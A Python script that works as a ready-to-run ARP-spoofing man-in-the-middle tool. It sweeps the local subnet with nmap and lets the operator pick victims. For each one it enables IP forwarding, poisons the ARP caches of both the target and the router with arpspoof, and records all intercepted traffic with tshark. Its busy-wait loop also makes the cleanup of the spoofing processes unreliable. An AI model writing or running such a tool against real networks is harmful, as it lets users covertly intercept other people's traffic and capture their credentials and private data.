#!/usr/bin/python

import shlex
import netifaces as ni
from subprocess import getoutput, Popen, DEVNULL
from argparse import ArgumentParser
from prettytable import SINGLE_BORDER
from prettytable.colortable import ColorTable, Themes


table = ColorTable(theme=Themes.OCEAN)

table.set_style(SINGLE_BORDER)
table.field_names = ["ID", "IP", "MAC", "Technology"]


parser = ArgumentParser()

parser.add_argument("-i", "--interface", help="Interface", required=True)
parser.add_argument("-f", "--file", help="File to write captured log in (default : test.out)", default="test.out")
# parser.add_argument("-h", "--help", help="See help")


args = parser.parse_args()

interface = args.interface
file_to_write = args.file

if interface not in ni.interfaces(): exit("No such interface")

your_ip = ni.ifaddresses(interface)[ni.AF_INET][0]['addr']

router_ip = your_ip.split(".")
router_ip[3] = "1"
router_ip = ".".join(router_ip)

hosts = [""]
i = 1
result = getoutput(f"nmap -sn {router_ip[:-1]}2-255").split("\n")[1:-1]
for resp in result:
    resp = resp.split()
    if resp[0] == "Nmap":
        pos_name = resp[-2]
        ip = resp[-1].replace("(", "").replace(")", "")
    if resp[0] == "MAC":
        MAC = resp[2]
        tech = " ".join(resp[3:])
        hosts.append({"ip": ip, "MAC": MAC, "tech": tech})
        # print(f"[{i}]", ip, MAC, tech)
        table.add_row([i, ip, MAC, tech])
        i += 1

print(table)

target = input("Specify the targets >> ")
targets = []
flag = False
if target == "all":
    targets = [i for i in range(1, len(hosts))]
    flag = True
elif "-" in target:
    while "-" in target:
        place = target.index("-")
        p = target[place - 1]
        pl = place - 1
        q = "" + p
        while p != "," and pl != 0:
            pl -= 1
            p = target[pl]
            q += p
        f_ind = pl + 1
        first = q[::-1]
        if "," in first: first = first[1:]
        p = target[place + 1]
        pl = place + 1
        q = "" + p
        while p != "," and pl != len(target) - 1:
            pl += 1
            p = target[pl]
            q += p
        l_ind = pl
        last = q
        if "," in last: last = q[:-1]
        for i in range(int(first), int(last) + 1): targets.append(i)
        target = target[:f_ind] + target[l_ind+1:]
    
if not flag:        
    for el in target.split(','): targets.append(int(el))
    targets = sorted(targets)

if targets[-1] > len(hosts) - 1: exit("Wrong choice")

getoutput("sysctl -w net.ipv4.ip_forward=1")

p = []
for i in targets:
    target = hosts[i]
    print(f"Start arpspoof to {target['tech']} with ip {target['ip']} with MAC {target['MAC']}")
    
    s1 = shlex.split(f"arpspoof -i {interface} -t {target['ip']} {router_ip}")
    s2 = shlex.split(f"arpspoof -i {interface} -t {router_ip} {target['ip']}")
    p.append( (Popen(s1, stdout=DEVNULL, stderr=DEVNULL), Popen(s2, stdout=DEVNULL, stderr=DEVNULL)) )

tshark = Popen(shlex.split(f"tshark -i {interface} -w {file_to_write}"), stdout=DEVNULL, stderr=DEVNULL)

while True:
    try: pass
    except KeyboardInterrupt:
        for el in p:
            el[0].kill()
            el[1].kill()
